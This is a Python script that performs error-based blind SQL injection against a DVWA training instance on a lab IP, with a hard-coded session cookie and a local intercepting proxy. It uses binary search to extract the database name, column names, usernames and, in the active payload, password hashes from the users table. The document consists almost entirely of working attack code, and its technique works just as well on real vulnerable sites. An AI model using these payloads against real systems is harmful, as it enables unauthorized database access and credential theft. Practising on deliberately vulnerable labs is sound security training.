import math
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def req(num, oper, pas):
    url = "http://192.168.131.135/dvwa/vulnerabilities/sqli/?id="
    cookies = {"PHPSESSID": "tv5rg3vjoucorm3ou97jbfbh2v", "security": "low"}
    # payload = "' or (select if((ascii(substring(database(), %s, 1)) %s %s),(select table_name from information_schema.tables),'a')) = 'a'-- " % (num, oper, pas)
    # payload = "' or (select if((ascii(substring((select column_name from information_schema.columns where table_name='users' limit 6,1), %s, 1)) %s %s),(select table_name from information_schema.tables),'a')) = 'a'-- " % (num, oper, pas)
    # payload = "' or (select if((ascii(substring((select user from users limit 1,1), %s, 1)) %s %s),(select table_name from information_schema.tables),'a')) = 'a'-- " % (num, oper, pas)
    payload = "' or (select if((ascii(substring((select password from users limit 1,1), %s, 1)) %s %s),(select table_name from information_schema.tables),'a')) = 'a'-- " % (num, oper, pas)
    payload_encoded = urllib.parse.quote(payload)
    url = url + payload_encoded + "&Submit=Submit"
    return requests.get(url, cookies=cookies, proxies=proxies, verify = False) 

def sqli():
    data = ""
    for i in range(1,40):
        first = 32
        last = 126
        while first <= last:
            middle = math.floor(first + (last-first)/2)
            if "Fatal error" in req(i, '=', middle).text:
                data += chr(middle)
                sys.stdout.write("\r" + data)
                sys.stdout.flush
                break
            elif "Fatal error" in req(i, '>', middle).text:
                sys.stdout.write("\r" + data + chr(middle))
                sys.stdout.flush
                first = middle + 1
            else:
                sys.stdout.write("\r" + data + chr(middle))
                sys.stdout.flush
                last = middle - 1
                

def main(): 
    sqli()        

if __name__ == "__main__":
    main()